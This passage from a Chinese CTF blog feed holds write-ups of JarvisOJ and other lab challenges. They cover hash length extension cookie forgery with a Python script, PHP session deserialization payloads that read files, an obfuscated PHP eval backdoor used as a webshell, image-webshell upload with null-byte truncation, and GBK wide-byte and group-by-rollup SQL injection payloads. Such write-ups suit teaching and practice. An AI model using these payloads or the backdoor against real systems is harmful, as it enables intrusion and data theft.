//我们要添加的数据fcdc3840332555511c4e4323f6decb07;&quot;tseug&quot;:5:s\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x00;&quot;nimda&quot;:5:s  //记得逆序一下，然后URL编码</code></pre><p>得到</p><pre><code>role: s%3A5%3A%22admin%22%3B%00%00%00%00%00%00%00%C0%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80s%3A5%3A%22guest%22%3Bhsh: fcdc3840332555511c4e4323f6decb07</code></pre><p>放在cookie里就可以了。</p><p>放一个其他人写的脚本</p><pre><code># -*- coding: utf-8 -*-import requests,hashpumpy,urllibdef webre(): #py2url = &apos;http://web.jarvisoj.com:32778/&apos;sha = &apos;3a4727d57463f122833d9e732f94e4e0&apos;string0 = &apos;;&quot;tseug&quot;:5:s&apos;string1 = &apos;;&quot;nimda&quot;:5:s&apos;for i in range(15):    digest, message = hashpumpy.hashpump(sha,string0,string1,i)    payload ={&apos;role&apos;:urllib.quote(message[::-1]), &apos;hsh&apos;:digest}    #payload ={&apos;role&apos;:(message[::-1]), &apos;hsh&apos;:digest}    print i,payload    html = requests.get(url,cookies=payload).text#提交答案    if &apos;Welcome&apos; in html:        print htmlwebre()</code></pre><h3 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h3><p>题目链接：<a href="http://web.jarvisoj.com:32784/" target="_blank" rel="noopener">http://web.jarvisoj.com:32784/</a></p><pre><code>&lt;?php//A webshell is wait for youini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);session_start();class OowoO{    public $mdzz;    function __construct()    {        $this-&gt;mdzz = &apos;phpinfo();&apos;;    }    function __destruct()    {        eval($this-&gt;mdzz);    }}if(isset($_GET[&apos;phpinfo&apos;])){    $m = new OowoO();}else{    highlight_string(file_get_contents(&apos;index.php&apos;));}?&gt;</code></pre><p>观察到题目phpinfo中的配置</p><p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5k7ltycs7j30we056t8z.jpg" alt></p><p>构造一个POST页面</p><pre><code>&lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;&lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt;</code></pre><p>由题目的<code>phpinfo</code>可知，全局session序列化器设置为了<code>php_serialize</code>，因此<code>upload_progress</code>会用<code>php_serialize</code>的方式创建<code>session</code>文件.在执行<code>index.php</code>时，该代码将处理器设置为了php,然后<code>session_start()</code>来读取session文件。由上文的php序列化器处理方式可知我们在session中构造<code>|序列化字符串</code>就可以。同时该题目的<code>cleanup</code>也设置为了<code>off</code></p><p>然后进行序列化。将处理器设置为<code>php_serialize</code></p><pre><code>&lt;?php//A webshell is wait for youini_set(&apos;session.serialize_handler&apos;, &apos;php_serialize&apos;);session_start();class OowoO{public $mdzz;}$a = new OowoO();$a-&gt;mdzz = &apos;print_r(scandir(dirname(__FILE__)));&apos;;echo serialize($a);?&gt;</code></pre><p>得到</p><pre><code>O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;}</code></pre><p>先在本地打开POST页面，随便提交一个东西然后抓包将<code>filename</code>改为序列化字符串。同时为了达到使用php解释后得到我们想要的结果，要在最前面加上<code>|</code>，同时为了防止转义，在引号前面加上<code>\</code>.</p><p>读到如下信息</p><p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5k7lqvj32j30r807jgmn.jpg" alt></p><p>由<code>phpinfo</code>中<code>Apache Environment</code>可知题目路径为<code>/opt/lampp/htdocs/index.php</code></p><p>于是我们修改mdzz的值为</p><pre><code>print_r(file_get_contents(&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;));</code></pre><p>得到</p><pre><code>O:5:\&quot;OowoO\&quot;:1:{s:4:\&quot;mdzz\&quot;;s:88:\&quot;print_r(file_get_contents(\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&quot;));\&quot;;}</code></pre><p>提交得到flag</p><pre><code>$flag=&quot;CTF{4d96e37f4be998c50aa586de4ada354a}&quot;</code></pre><h3 id="api"><a href="#api" class="headerlink" title="api"></a>api</h3><p>题目链接：<a href="http://web.jarvisoj.com:9882/" target="_blank" rel="noopener">http://web.jarvisoj.com:9882/</a></p><p>考察XXE，拿到题目先看一下源码发现处理xml的代码，于是抓包改content-type测试xml代码</p><p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g69zc4iiq8j30ne0cpdh5.jpg" alt="测试xml是否可以执行"></p><p>拿到flag</p><p><img src="http://wx2.sinaimg.cn/mw690/006boCb9ly1g69zc6zc3cj30nr0aejsl.jpg" alt="读文件"></p><h3 id="chopper"><a href="#chopper" class="headerlink" title="chopper"></a>chopper</h3><p>刚开始的网站点击管理员登陆提示<code>you are not admin</code>没有权限访问/admin这个路径，查看源码发现提示admin的IP<code>&lt;!--&lt;script&gt;alert(&#39;admin ip is 202.5.19.128&#39;)&lt;/script&gt;--&gt;</code>；回到最开始的菜刀页面查看源码发现图片的链接很奇怪</p><pre><code>http://web.jarvisoj.com:32782/proxy.php?url=http://dn.jarvisoj.com/static/images/proxy.jpg</code></pre><p>它是通过前面一个链接的<code>proxy.php</code>引入的，联想到通过构造URL的方式利用代理访问我们没有权限的路径，于是我们构造</p><pre><code>http://web.jarvisoj.com:32782/proxy.php?url=http://202.5.19.128/proxy.php?url=http://web.jarvisoj.com:32782/admin/</code></pre><p>然后我们扫到这个路径下有<code>robots.txt</code></p><pre><code>User-agent: *Disallow:trojan.phpDisallow:trojan.php.txt</code></pre><p>访问txt发现一段代码</p><pre><code>&lt;?php ${(&quot;#&quot;^&quot;|&quot;).(&quot;#&quot;^&quot;|&quot;)}=(&quot;!&quot;^&quot;`&quot;).(&quot;( &quot;^&quot;{&quot;).(&quot;(&quot;^&quot;[&quot;).(&quot;~&quot;^&quot;;&quot;).(&quot;|&quot;^&quot;.&quot;).(&quot;*&quot;^&quot;~&quot;);${(&quot;#&quot;^&quot;|&quot;).(&quot;#&quot;^&quot;|&quot;)}((&quot;-&quot;^&quot;H&quot;). (&quot;]&quot;^&quot;+&quot;). (&quot;[&quot;^&quot;:&quot;). (&quot;,&quot;^&quot;@&quot;). (&quot;}&quot;^&quot;U&quot;). (&quot;e&quot;^&quot;A&quot;). (&quot;(&quot;^&quot;w&quot;).(&quot;j&quot;^&quot;:&quot;). (&quot;i&quot;^&quot;&amp;&quot;). (&quot;#&quot;^&quot;p&quot;). (&quot;&gt;&quot;^&quot;j&quot;). (&quot;!&quot;^&quot;z&quot;). (&quot;T&quot;^&quot;g&quot;). (&quot;e&quot;^&quot;S&quot;). (&quot;_&quot;^&quot;o&quot;). (&quot;?&quot;^&quot;b&quot;). (&quot;]&quot;^&quot;t&quot;));?&gt;</code></pre><p>运行结果</p><pre><code>Notice: Undefined offset: 360 in E:\only_for_code_test.php(1) : assert code on line 1Warning: assert(): Assertion &quot;eval($_POST[360])&quot; failed in E:\only_for_code_test.php on line 1</code></pre><p>菜刀连一下php文件即可得到flag</p><h3 id="Easy-Gallery"><a href="#Easy-Gallery" class="headerlink" title="Easy Gallery"></a>Easy Gallery</h3><p>上传页面上传图片马得到图片ID</p><p>图片马 ：<code>copy 1.jpg/b+1.php 2.jpg</code></p><p>直接访问/uploads/ID看不到图片，同时view页面也没有什么卵用，观察URL</p><p>访问</p><pre><code>http://web.jarvisoj.com:32785/index.php/index.php?page=uploads/1566654901.jpg</code></pre><p>看到回显</p><p>Warning: fopen(uploads/1566654901.jpg.php): failed to open stream: No such file or directory in /opt/lampp/htdocs/index.php on line 24<br>No such file!</p><p>尝试%00截断</p><pre><code>GET /index.php?page=uploads/1566655841.jpg%00 HTTP/1.1</code></pre><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><blockquote><p><a href="http://www.qingpingshan.com/bc/php/394154.html" target="_blank" rel="noopener">http://www.qingpingshan.com/bc/php/394154.html</a></p><p><a href="https://www.t00ls.net/articles-48721.html#" target="_blank" rel="noopener">https://www.t00ls.net/articles-48721.html#</a></p><p><a href="https://xz.aliyun.com/t/3674#toc-14" target="_blank" rel="noopener">https://xz.aliyun.com/t/3674#toc-14</a></p></blockquote><blockquote><p><a href="https://xz.aliyun.com/t/2563#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/2563#toc-2</a></p><p><a href="https://www.jianshu.com/p/5342d07a6956" target="_blank" rel="noopener">https://www.jianshu.com/p/5342d07a6956</a><br><a href="https://www.freebuf.com/articles/web/69264.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/69264.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
            <tag> serialize </tag>
            
            <tag> SQL </tag>
            
            <tag> 哈希长度扩展攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Session_unserlize</title>
      <link href="/2019/08/01/session-unserialize/"/>
      <url>/2019/08/01/session-unserialize/</url>
      
        <content type="html"><![CDATA[<p>session的反序列化利用</p><a id="more"></a><p>8/1/2019 10:44:57 AM </p><h2 id="对魔法函数的再次认识"><a href="#对魔法函数的再次认识" class="headerlink" title="对魔法函数的再次认识"></a>对魔法函数的再次认识</h2><h3 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h3><pre><code>__construct()//创建对象时触发__destruct() //对象被销毁时触发__call() //在对象上下文中调用不可访问的方法时触发__callStatic() //在静态上下文中调用不可访问的方法时触发__get() //用于从不可访问的属性读取数据__set() //用于将数据写入不可访问的属性__isset() //在不可访问的属性上调用isset()或empty()触发__unset() //在不可访问的属性上使用unset()时触发__invoke() //当脚本尝试将对象调用为函数时触发</code></pre><h4 id="序列化机制"><a href="#序列化机制" class="headerlink" title="序列化机制"></a>序列化机制</h4><pre><code>Strings:size:value;Integeri:value;Booleanb:value; (does not store &quot;true&quot; or &quot;false&quot;, does store &apos;1&apos; or &apos;0&apos;)NullN;Arraya:size:{key definition;value definition;(repeated per element)}ObjectO:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)}</code></pre><h4 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h4><blockquote><p>serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并<strong>返回一个包含对象中所有应被序列化的变量名称的数组</strong>。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。</p></blockquote><p>也就是说序列化时没有被利用到的属性会被清理。</p><h4 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h4><blockquote><p>unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。</p></blockquote><p>也就是说会在<code>unserilize</code>之前准备好可能会用到的对象资源</p><p>拿<a href="https://xz.aliyun.com/t/3674#toc-5" title="师傅博客" target="_blank" rel="noopener">https://xz.aliyun.com/t/3674#toc-5</a>师傅文章的代码做个例子：</p><pre><code>&lt;?php class Caiji{public function __construct($ID, $sex, $age){$this-&gt;ID = $ID;$this-&gt;sex = $sex;$this-&gt;age = $age;$this-&gt;info = sprintf(&quot;ID: %s, age: %d, sex: %s&quot;, $this-&gt;ID, $this-&gt;sex, $this-&gt;age);}public function getInfo(){echo $this-&gt;info . &apos;&lt;br&gt;&apos;;}/** * serialize前调用 用于删选需要被序列化存储的成员变量 * @return array [description] */public function __sleep(){echo __METHOD__ . &apos;&lt;br&gt;&apos;;return [&apos;ID&apos;, &apos;sex&apos;, &apos;age&apos;];}/** * unserialize前调用 用于预先准备对象资源 */public function __wakeup(){echo __METHOD__ . &apos;&lt;br&gt;&apos;;$this-&gt;info = sprintf(&quot;ID: %s, age: %d, sex: %s&quot;, $this-&gt;ID, $this-&gt;sex, $this-&gt;age);}}$me = new Caiji(&apos;Luc1fer&apos;, 20, &apos;male&apos;);$me-&gt;getInfo();//存在__sleep(函数，$info属性不会被存储$temp = serialize($me);echo $temp . &apos;&lt;br&gt;&apos;;$me = unserialize($temp);//__wakeup()组装的$info$me-&gt;getInfo();?&gt;</code></pre><p>执行结果如下 ：</p><p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5jyd32htkj30iv04dt8q.jpg" alt="魔法函数执行结果"></p><p>如果看不太清楚函数的用法，我们可以再改一下代码看看效果，我们这次注释掉了<code>__sleep()</code>函数，并且在其他函数里增加了提示语句：</p><p><img src="http://wx4.sinaimg.cn/mw690/006boCb9ly1g5jyiiweobj30ox05n0sx.jpg" alt="修改之后的效果"></p><p>可以看到因为<code>sleep</code>的存在，<code>info</code>属性被删除，导致<code>getinfo()</code>使用时无法打印<code>Info</code>属性，在我们注释掉<code>sleep</code>之后，所有的属性都正常打印了，<code>wakeup</code>也是如此。</p><h4 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h4><blockquote><p>__toString() 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将发出一条E_RECOVERABLE_ERROR 级别的致命错误。</p></blockquote><pre><code>&lt;?php class Caiji{public function __construct($ID, $sex, $age){$this-&gt;ID = $ID;$this-&gt;sex = $sex;$this-&gt;age = $age;$this-&gt;info = sprintf(&quot;ID: %s, age: %d, sex: %s&quot;, $this-&gt;ID, $this-&gt;sex, $this-&gt;age);}public function __toString(){return $this-&gt;info;}}$me = new Caiji(&apos;twosmi1e&apos;, 20, &apos;male&apos;);echo &apos;__toString:&apos; . $me . &apos;&lt;br&gt;&apos;;?&gt;__toString:ID: twosmi1e, age: 20, sex: male</code></pre><h2 id="session-反序列化"><a href="#session-反序列化" class="headerlink" title="session 反序列化"></a>session 反序列化</h2><p>PHP在session存储和读取时都会有一个序列化和反序列化的过程，php内置了多种处理器用于存取$_SESSION数据，对数据进行序列化与反序列化。</p><p>这是php.ini中的配置项</p><p><img src="https://raw.githubusercontent.com/twosmi1e/twosmi1e.github.io/master/2018/12/20/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1545234989274.png" alt="phpinfo配置"><br><img src="https://raw.githubusercontent.com/twosmi1e/twosmi1e.github.io/master/2018/12/20/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1545235002297.png" alt></p><ul><li><code>session.save_path</code> 设置session的存储路径</li><li><code>session.save_handler</code> 设定用户自定义存储函数</li><li><code>session.auto_start</code> 指定会话模块是否在请求开始时启动一个会话</li><li><code>session.serialize_handler</code> 定义用来序列化/反序列化的处理器名字。默认使用php</li></ul><p>对于处理器，常用的有三种，对应三种不同的处理格式</p><p><img src="http://wx2.sinaimg.cn/mw690/006boCb9ly1g5jzfr3tdsj30nx066q3f.jpg" alt="处理器的处理方式"></p><p>我们可以看看不同储存方式储存的区别：</p><p>选择不同的处理器来生成session，生成的文件就储存在上图对应目录中</p><pre><code>&lt;?ini_set(&apos;session.serialize_handler&apos;, &apos;php_serialize&apos;);session_start();$_SESSION[&apos;name&apos;] = &apos;Luc1fer&apos;;?&gt;php_serilize: a:1:{s:4:&quot;name&quot;;s:7:&quot;Luc1fer&quot;;}php: name|s:7:&quot;Luc1fer&quot;;php_binary: EOTnames:7:&quot;Luc1fer&quot;;</code></pre><p>如果<strong>PHP在反序列化存储的$_SESSION数据时使用的处理器和序列化使用的处理器不同</strong>，会导致数据无法正确反序列化，通过特殊构造甚至可以伪造任意数据。</p><h3 id="设置session序列化方法可能带来的隐患"><a href="#设置session序列化方法可能带来的隐患" class="headerlink" title="设置session序列化方法可能带来的隐患"></a>设置session序列化方法可能带来的隐患</h3><p>如果我们创建一个写入session的脚本</p><pre><code>&lt;?phpini_set(&apos;session.serialize_handler&apos;, &apos;php_serialize&apos;);session_start();$name = $_GET[&apos;name&apos;] ? $_GET[&apos;name&apos;] : &quot;name&quot;; $value = $_GET[&apos;value&apos;] ? $_GET[&apos;value&apos;] : &quot;value&quot;;$_SESSION[name] = $value;  if(isset($_GET[&apos;clean&apos;])) session_destroy();</code></pre><p>此时我们传入<code>value=|s:5:&quot;hack!&quot;;</code>,在进行session存储时的内容就会变成：<code>a:1:{s:4:&quot;name&quot;;s:13:&quot;|s:5:&quot;hack!&quot;;&quot;;}</code>.我们可以知道在<code>php_serialize</code>中<code>a</code>代表一个数组，包含一个元素，但是如果其他的php页面没有设置处理器为<code>php_serialize</code>而使用默认的php，那么在php解释session中的内容时，<code>|</code>前的部分会被解释称键，后的部分会被解释成值，在这里我们传入的<code>s:5:&quot;hack!&quot;;</code>会被解析成<code>hack!&quot;</code>，后面的<code>&quot;;</code>会被忽略。,最后解析的结果就是<code>Array ([a:1:{s:4:&quot;name&quot;;s:13:&quot;}]=&gt;hack!)</code>。</p><p>我们可以通过此来利用反序列化漏洞。</p><h3 id="session-upload-progress"><a href="#session-upload-progress" class="headerlink" title="session.upload_progress"></a>session.upload_progress</h3><blockquote><p>Session 上传进度 </p></blockquote><blockquote><p>当 session.upload_progress.enabledINI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态 </p></blockquote><blockquote><p>当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是 session.upload_progress.prefix 与 session.upload_progress.name连接在一起的值。通常这些键值可以通过读取INI设置来获得。</p></blockquote><p>在POST一个文件前，通过<code>POST</code>一个name为<code>Session.upload_progress</code>，value为用户自定义的一个upload_id。在文件上传过程中会生成上传信息。在上传结束后session中的键值对会直接消失。</p><p>同时还要注意<code>session.upload_progress.cleanup</code>这个参数，这个选项的意思是在上传完成时从session中清除上传进度信息，默认开启。在关闭后上传信息会一直保存在session中。</p><p>通过上面两部分我们可以更改session为自定义数据。</p><h3 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h3><p>JarvisOJ上的题目，题目链接：<a href="http://web.jarvisoj.com:32784/" target="_blank" rel="noopener">http://web.jarvisoj.com:32784/</a></p><pre><code>&lt;?php//A webshell is wait for youini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);session_start();class OowoO{    public $mdzz;    function __construct()    {        $this-&gt;mdzz = &apos;phpinfo();&apos;;    }    function __destruct()    {        eval($this-&gt;mdzz);    }}if(isset($_GET[&apos;phpinfo&apos;])){    $m = new OowoO();}else{    highlight_string(file_get_contents(&apos;index.php&apos;));}?&gt;</code></pre><p>观察到题目phpinfo中的配置</p><p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5k7ltycs7j30we056t8z.jpg" alt></p><p>构造一个POST页面</p><pre><code>&lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;&lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt;</code></pre><p>由题目的<code>phpinfo</code>可知，全局session序列化器设置为了<code>php_serialize</code>，因此<code>upload_progress</code>会用<code>php_serialize</code>的方式创建<code>session</code>文件.在执行<code>index.php</code>时，该代码将处理器设置为了php,然后<code>session_start()</code>来读取session文件。由上文的php序列化器处理方式可知我们在session中构造<code>|序列化字符串</code>就可以。同时该题目的<code>cleanup</code>也设置为了<code>off</code></p><p>然后进行序列化。将处理器设置为<code>php_serialize</code></p><pre><code>&lt;?php//A webshell is wait for youini_set(&apos;session.serialize_handler&apos;, &apos;php_serialize&apos;);session_start();class OowoO{public $mdzz;}$a = new OowoO();$a-&gt;mdzz = &apos;print_r(scandir(dirname(__FILE__)));&apos;;echo serialize($a);?&gt;</code></pre><p>得到</p><pre><code>O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;}</code></pre><p>先在本地打开POST页面，随便提交一个东西然后抓包将<code>filename</code>改为序列化字符串。同时为了达到我们想要的结果要在最前面加上<code>|</code>，同时为了防止转义，在引号前面加上<code>\</code>.</p><p>读到如下信息</p><p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5k7lqvj32j30r807jgmn.jpg" alt></p><p>由<code>phpinfo</code>中<code>Apache Environment</code>可知题目路径为<code>/opt/lampp/htdocs/index.php</code></p><p>于是我们修改mdzz的值为</p><pre><code>print_r(file_get_contents(&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;));</code></pre><p>得到</p><pre><code>O:5:\&quot;OowoO\&quot;:1:{s:4:\&quot;mdzz\&quot;;s:88:\&quot;print_r(file_get_contents(\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&quot;));\&quot;;}</code></pre><p>提交得到flag</p><pre><code>$flag=&quot;CTF{4d96e37f4be998c50aa586de4ada354a}&quot;</code></pre><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><blockquote><p><a href="http://www.qingpingshan.com/bc/php/394154.html" target="_blank" rel="noopener">http://www.qingpingshan.com/bc/php/394154.html</a></p><p><a href="https://www.t00ls.net/articles-48721.html#" target="_blank" rel="noopener">https://www.t00ls.net/articles-48721.html#</a></p><p><a href="https://xz.aliyun.com/t/3674#toc-14" target="_blank" rel="noopener">https://xz.aliyun.com/t/3674#toc-14</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> serialize </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL</title>
      <link href="/2019/07/28/SQL/"/>
      <url>/2019/07/28/SQL/</url>
      
        <content type="html"><![CDATA[<p>大大小小比赛碰到了好多要不没见过要不不会的注入，这里记录一下吧</p><a id="more"></a><hr><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>GBK是一种多字符的编码，通常来说，一个GBK编码的字符占用两个字节，一个UTF-8的字符占用三个字节。</p><p><strong>转义字符</strong>：为了过滤用户输入数据，对一些特殊字符加上反斜杠”<br>“进行转义，mysql中转义函数有</p><pre><code>addslashes,mysql_real_escape_string,mysql_escape_string等，还有一种是配置magic_quote_gpc,不过高版本已经移除该功能</code></pre><p><strong>宽字节注入</strong>是指mysql数据库在使用GBK编码时会认为两个字符是一个汉子(前一个字符的ascii码要大于128才到汉字范围)，而且当我们引入单引号时，mysql会调用转义函数，将单引号变为&#39;,其中的 \ 十六进制为%5C,mysql的GBK编码会认为 %df%5C 是一个宽字节，从而使单引号闭合(逃逸)，从而注入攻击。</p><p><strong>sql数据的变化过程</strong></p><pre><code>%df%27--&gt;addslashes()--&gt;%df%5C%27--&gt;GBK--&gt;運&apos;用户输入--&gt;过滤函数--&gt;代码层$sql--&gt;mysql处理请求--&gt;mysql中的sql</code></pre><p>测试题目是南邮的GBK injection</p><p>测试发现加上单引号没有报错但是有转义操作，在单引号前面插入了反斜杠</p><pre><code>?id=1&apos;        your sql:select id,title from news where id = &apos;1\&apos;&apos;</code></pre><p>进行宽字节注入</p><pre><code>?id=1%df%27your sql:select id,title from news where id = &apos;1運&apos;&apos;</code></pre><p>如上所述，加入%df之后mysql认为%df%5C是一个汉字，这样单引号就逃逸出来，但是这里还会报错，因为我们人为的闭合了一个单引号之后查询语句长这样</p><pre><code>id=&apos;運&apos;&apos;</code></pre><p>我们还要把最后一个单引号注释掉才行</p><pre><code>?id=1%df%27%23</code></pre><p>注入成功，该查询字段数，查询字段数要用union探测内容，而union得规则是必须列数相同才能正常展示，所以要探测列数，保证构造的查询结果与元数据查询结果的数据结构相同；’order by 1’代表按第一列升序排列，数字代表的列不存在就会报错</p><pre><code>?id=1%df%27 order by 2 %23your sql:select id,title from news where id = &apos;1運&apos; order by 2 #&apos;here is the information</code></pre><p>再探测字段的显示位，即表中数据第几位的字段可以显示。id的值要用-1或者表中没有用过的id值，否则测试值会被覆盖。</p><p>接下来就是常规的注入</p><pre><code>数据库?id=-1%df%27 union select 1,group_concat(database()) %23表?id=-1%df%27 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() %23字段?id=-1%df%27% union select 1,group_concat(column_name) from information_schema.columns where table_name=0x63746634 %23因为这对单引号的转义，我们使用十六进制来读取信息?id=-1%df%27 union select 1,group_concat(flag) from ctf4 %23</code></pre><h2 id="ISCC中碰到的group-by…with-rollup"><a href="#ISCC中碰到的group-by…with-rollup" class="headerlink" title="ISCC中碰到的group by…with rollup"></a>ISCC中碰到的group by…with rollup</h2><p>题目来自ISCC线下赛hint.txt</p><pre><code>$sql=&quot;SELECT pwd FROM user WHERE uname = &apos;{$_POST[&apos;uname&apos;]}&apos;&quot;;$query = mysqli_query($con,$sql); if (mysqli_num_rows($query) == 1) {     $key = mysqli_fetch_array($query);    if($key[&apos;pwd&apos;] == $_POST[&apos;pwd&apos;]) {        echo &quot;xxxxxxxxx&quot;;    }else{        echo &quot;你这密码不太对啊&quot;;    }}else if(mysqli_num_rows($query) == 0){    echo &quot;你这密码不太对啊&quot;;}else{    echo &quot;数据太多了&quot;;}</code></pre><p>分析题目可知我们需要post一个uname，进行弱比较相等，使得查询结果为空，然后我们也post一个空值就行了。</p><p>group by 分析</p><pre><code>mysql&gt; select * from member;+----+----------+--------------------------------------+-------------------+| id | username | pws                                  | email             |+----+----------+--------------------------------------+-------------------+|  1 | vince    | e10adc3949ba59abbe56e                   | vince@pikachu.com ||  2 | allen    | e10adc3949ba59abbe56e                   | allen@pikachu.com ||  3 | kobe     | e10adc3949ba59abbe56ekes                | kobe@pikachu.com  ||  4 | grady    | e10adc3949ba59abbe56e                 | grady@pikachu.com ||  5 | kevin    | e10adc3949ba59abbe56ema City Thunder | kevin@pikachu.com ||  6 | lucy     | e10adc3949ba59abbe56e                   | lucy@pikachu.com  ||  7 | lili     | e10adc3949ba59abbe56e                   | lili@pikachu.com  |+----+----------+--------------------------------------+-------------------+mysql&gt; select username from member where sex=&apos;boy&apos; group by username;+----------+| username |+----------+| allen|| grady|| kevin|| kobe || vince|+----------+5 rows in set (0.00 sec)</code></pre><p>group by 对结果进行分类，而with rollup字句将在查询的结果最后一行添上一行数据，来显示分组统计的基础上再进行数据的汇总，但是这里的汇总不是简单的求和，而是要根据对数据处理采用的函数决定的</p><pre><code>mysql&gt; select username from member where sex=&apos;boy&apos; group by username with rollup;+----------+| username |+----------+| allen|| grady|| kevin|| kobe || vince|| NULL |+----------+6 rows in set (0.00 sec)</code></pre><p>对于这个题目，我们需要使得查询的结果不为空。可以使用异或来绕过判断。同时配合php的比较特性来绕过对uname的判断。</p><pre><code> mysql&gt; select 1^1;+-----+| 1^1 |+-----+|   0 |+-----+1 row in set (0.00 sec)mysql&gt; select &apos;aaa&apos;=1;+---------+| &apos;aaa&apos;=1 |+---------+|   0 |+---------+1 row in set, 1 warning (0.00 sec)mysql&gt; select &apos;id&apos;=0;+--------+| &apos;id&apos;=0 |+--------+|  1 |+--------+1 row in set, 1 warning (0.00 sec)mysql&gt; select &apos;id111&apos;=0;+-----------+| &apos;id111&apos;=0 |+-----------+| 1 |+-----------+1 row in set, 1 warning (0.00 sec)uname=&apos;1&apos;^1--&gt;uname=0--&gt;相等#异或操作对任一操作数为NULL则返回NULL，对于非NULL得操作数，如果奇数个操作数非零，则值为1，否则为零。</code></pre><p>最后payload为：</p><pre><code>uname=&apos;1&apos;^1 group by pwd with rollup limit 1 offset 1%23&apos;</code></pre><p>稍微解释一下limit offset</p><pre><code>mysql&gt; select * from member limit 3 offset 1;+----+----------+----------------------------------+-----+-------------+-----------+-------------------+| id | username | pw   | sex | phonenum| address   | email |+----+----------+----------------------------------+-----+-------------+-----------+-------------------+|  2 | allen| e10adc3949ba59abbe56e057f20f883e | boy | 13676767767 | nba 76   | allen@pikachu.com ||  3 | kobe | e10adc3949ba59abbe56e057f20f883e | boy | 15988767673 | nba lakes | kobe@pikachu.com  ||  4 | grady| e10adc3949ba59abbe56e057f20f883e | boy | 13676765545 | nba hs   | grady@pikachu.com |+----+----------+----------------------------------+-----+-------------+-----------+-------------------+3 rows in set (0.00 sec)从第一行开始打印3行数据mysql&gt; select * from member limit 1,3;+----+----------+----------------------------------+-----+-------------+-----------+-------------------+| id | username | pw   | sex | phonenum| address   | email |+----+----------+----------------------------------+-----+-------------+-----------+-------------------+|  2 | allen| e10adc3949ba59abbe56e057f20f883e | boy | 13676767767 | nba 76   | allen@pikachu.com ||  3 | kobe | e10adc3949ba59abbe56e057f20f883e | boy | 15988767673 | nba lakes | kobe@pikachu.com  ||  4 | grady| e10adc3949ba59abbe56e057f20f883e | boy | 13676765545 | nba hs   | grady@pikachu.com |+----+----------+----------------------------------+-----+-------------+-----------+-------------------+3 rows in set (0.00 sec)从第一行开始打印三行</code></pre><p>为什么不直接用limit 1，1 呢？因为过滤了逗号。</p><h2 